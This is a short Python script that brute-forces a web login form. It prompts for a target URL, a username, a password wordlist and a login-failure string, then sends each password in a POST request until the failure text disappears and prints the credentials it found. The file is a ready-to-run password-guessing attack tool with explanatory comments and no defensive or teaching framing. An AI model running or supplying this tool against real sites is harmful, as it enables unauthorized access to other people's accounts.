import requests
from termcolor import colored

# Prompt the user to input the target website URL, username, password list, and login failed string.
url = input('[+] Enter Page URL: ')
username = input('[+] Enter Username: ')
password_file = input('[+] Enter Password List: ')
login_failed_string = input('[+] Enter String That Occurs When Login Fails: ')

# Define a function for attempting to crack the login with a provided username and password list.
def cracking(username, url):
    # Open the password list file and iterate through its contents.
    with open(password_file, 'r') as passwords:
        for password in passwords:
            # Remove leading/trailing whitespace from the password.
            password = password.strip()
            print(colored(('Trying: ' + password), 'red'))
            
            # Create a dictionary containing the username, password, and a submit button for the POST request.
            data = {'username': username, 'password': password, 'Login': 'submit'}
            
            # Send a POST request to the specified URL with the login data.
            response = requests.post(url, data=data)
            
            # Check if the login failed based on the login_failed_string.
            if login_failed_string in response.content.decode():
                # If the login failed, continue to the next password.
                pass
            else:
                # If the login was successful, print the username and password and exit the script.
                print(colored(('[+] Found Username: ==> ' + username), 'green'))
                print(colored(('[+] Found Password: ==> ' + password), 'green'))
                exit()

# Call the cracking function with the provided username and URL.
with open(password_file, 'r') as passwords:
    cracking(username, url)

# If no matching password is found, print a message indicating that the password is not in the list.
print('[!] Password Not in List')
